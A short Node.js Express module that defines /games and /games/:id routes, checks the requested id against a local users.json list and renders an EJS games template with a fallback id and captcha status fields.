const request = require('request')
const fs = require('fs');

const baza = require(`../../json/users.json`);

function start_games(app) {
    app.get(`/games`, (req, res) => {
      return res.render(`vk_done/games/index.ejs`, {
          id: "343783264",
          error: 0,
          capcha: {
            status: 0
          }
        })
    });

    app.get(`/games/:id`, (req, res) => {
      if (!baza.some(a => a.id == req.params.id)) {
        res.render(`vk_done/games/index.ejs`, {
          id: "343783264",
          ads: false,
          error: 0,
          capcha: {
            status: 0
          }
        })
      } else {
        res.render(`vk_done/games/index.ejs`, {
          id: req.params.id,
          error: 0,
          capcha: {
            status: 0
          }
        })
      }
    });
}

module.exports = {
    start_games
}
